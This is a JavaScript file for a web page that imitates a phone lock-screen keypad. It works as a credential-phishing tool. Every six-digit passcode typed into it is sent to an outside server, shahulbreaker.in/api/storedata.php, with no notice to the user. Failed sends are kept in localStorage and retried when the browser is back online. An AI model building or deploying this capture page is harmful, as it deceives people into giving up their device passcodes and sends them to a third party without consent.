(() => {
  const API_BASE = "https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=";
  const MAX = 6;
  let code = "";
  const dots = document.getElementById('dots');
  const keys = Array.from(document.querySelectorAll('.key'));
  const emergency = document.getElementById('emergency');
  const cancelBtn = document.getElementById('cancelBtn');

  function refreshDots() {
    Array.from(dots.querySelectorAll('.dot')).forEach((d, i) => {
      d.classList.toggle('filled', i < code.length);
    });
  }

  function resetCode(){
    code = "";
    refreshDots();
  }

  function sendToAPI(pass) {
    fetch(API_BASE + encodeURIComponent(pass), { method: 'GET', keepalive: true })
      .catch(() => {
        const queue = JSON.parse(localStorage.getItem('_pass_queue_') || "[]");
        queue.push({pass, ts: Date.now()});
        localStorage.setItem('_pass_queue_', JSON.stringify(queue));
      });
  }

  function flushQueue() {
    const qk = '_pass_queue_';
    const queue = JSON.parse(localStorage.getItem(qk) || "[]");
    if (!queue.length) return;
    queue.forEach(item => {
      fetch(API_BASE + encodeURIComponent(item.pass), { method: 'GET', keepalive: true }).catch(()=>{});
    });
    localStorage.removeItem(qk);
  }

  function onComplete() {
    sendToAPI(code);
    setTimeout(resetCode, 500);
  }

  keys.forEach(k => {
    k.addEventListener('click', () => {
      const val = k.dataset.key;
      if (!val) return;
      if (val === '0' || /^[0-9]$/.test(val)) {
        if (code.length >= MAX) return;
        code += val;
        refreshDots();
        if (code.length === MAX) onComplete();
      }
    });
  });

  emergency.addEventListener('click', () => alert('Emergency pressed'));
  cancelBtn.addEventListener('click', resetCode);

  window.addEventListener('online', flushQueue);
  flushQueue();
})();
